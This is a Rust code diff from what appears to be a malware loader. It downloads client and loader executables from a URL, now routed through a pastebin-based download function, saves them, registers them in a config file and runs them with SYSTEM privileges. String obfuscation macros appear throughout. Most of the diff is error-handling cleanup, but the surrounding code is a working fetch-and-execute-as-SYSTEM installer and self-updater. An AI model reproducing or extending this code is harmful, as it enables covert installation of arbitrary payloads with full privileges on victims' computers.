@@ -4,10 +4,10 @@ use loader_vars::{
     constants::{ loader_version, system_service_directory },
     types::receive::{ FlSrc, RnCnfgPrms },
 };
-use anyhow::Result;
+use anyhow::{ Context, Result };
 use shared::{
     constants::{ client_exe_name, system_loader_exe_name },
-    network::basic::download_bytes_from_url,
+    network::basic::{ download_bytes_from_url, download_file_from_url_router_pastebin },
     utils::{
         config::{ load_mib_config, write_mib_config, HstCnfg },
         functions::{
@@ -49,9 +49,19 @@ pub fn run_config(params: RnCnfgPrms, update_only: bool) -> Result<()> {
 
     let mut highest_installed_loader = HstCnfg {
         version: loader_version(),
-        folder_path: get_current_exe_dir()?.to_str().unwrap().to_owned(),
-        exe_path: get_current_exe()?.to_str().unwrap().to_owned(),
-        config_path: get_current_exe_dir()?.join(s!("cache.cfg")).to_str().unwrap().to_owned(),
+        folder_path: get_current_exe_dir()
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
+        exe_path: get_current_exe()
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
+        config_path: get_current_exe_dir()
+            .join(s!("cache.cfg"))
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
     };
     for loader in &mib_config.ldrs {
         if loader.version > highest_installed_loader.version {
@@ -75,7 +85,7 @@ pub fn run_config(params: RnCnfgPrms, update_only: bool) -> Result<()> {
 }
 fn install_client(source: FlSrc, version: u64) -> Result<()> {
     let bytes = match source {
-        FlSrc::Url(url) => download_bytes_from_url(&url)?,
+        FlSrc::Url(url) => download_file_from_url_router_pastebin(&url)?,
         FlSrc::Bt(vec) => vec,
     };
     if bytes.is_empty() {
@@ -97,22 +107,34 @@ fn install_client(source: FlSrc, version: u64) -> Result<()> {
 
     mib_config.clnts.push(HstCnfg {
         version,
-        folder_path: client_dir.to_str().unwrap().to_owned(),
-        exe_path: exe_path.to_str().unwrap().to_owned(),
-        config_path: config_path.to_str().unwrap().to_owned(),
+        folder_path: client_dir
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
+        exe_path: exe_path
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
+        config_path: config_path
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
     });
 
     write_mib_config(&mib_config)?;
     std::thread::sleep(Duration::from_millis(2000));
 
-    try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
+    try_spawn_program_as_system(
+        exe_path.to_str().context(s!("Failed to convert pathbuf to_str").to_owned())?,
+        None
+    )?;
 
     Ok(())
 }
 
 fn install_self(source: FlSrc, version: u64) -> Result<()> {
     let bytes = match source {
-        FlSrc::Url(url) => download_bytes_from_url(&url)?,
+        FlSrc::Url(url) => download_file_from_url_router_pastebin(&url)?,
         FlSrc::Bt(vec) => vec,
     };
     if bytes.is_empty() {
@@ -134,15 +156,27 @@ fn install_self(source: FlSrc, version: u64) -> Result<()> {
 
     mib_config.ldrs.push(HstCnfg {
         version,
-        folder_path: loader_dir.to_str().unwrap().to_owned(),
-        exe_path: exe_path.to_str().unwrap().to_owned(),
-        config_path: config_path.to_str().unwrap().to_owned(),
+        folder_path: loader_dir
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
+        exe_path: exe_path
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
+        config_path: config_path
+            .to_str()
+            .context(s!("Failed to convert pathbuf to_str").to_owned())?
+            .to_owned(),
     });
 
     write_mib_config(&mib_config)?;
     std::thread::sleep(Duration::from_millis(2000));
 
-    try_spawn_program_as_system(exe_path.to_str().unwrap(), None)?;
+    try_spawn_program_as_system(
+        exe_path.to_str().context(s!("Failed to convert pathbuf to_str").to_owned())?,
+        None
+    )?;
 
     Ok(())
 }
